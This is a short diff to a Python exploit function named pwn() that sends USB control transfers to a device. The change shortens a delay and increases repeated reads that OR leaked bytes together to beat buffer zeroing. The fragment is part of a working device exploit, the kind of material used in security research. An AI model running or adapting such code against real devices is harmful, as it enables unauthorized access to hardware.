@@ -86,12 +86,12 @@ def pwn():
   print("[+] triggering exploit")
   assert len(device.ctrl_transfer(0xA1, 1, 0, 0, len(buf), 1000)) == len(buf)
 
-  time.sleep(0.1)
+  time.sleep(0.01)
 
   buf = bytearray(64)
   # we seem to be fighting against something else trying to memset our buffer to 0, so
   # we read many times and OR the results together
-  for _ in range(10):
+  for _ in range(32):
     received = device.ctrl_transfer(0xA1, 1, 0, 0, 256, 1000).tobytes()
     assert len(received) == 256
     for i, x in enumerate(received[192:]):
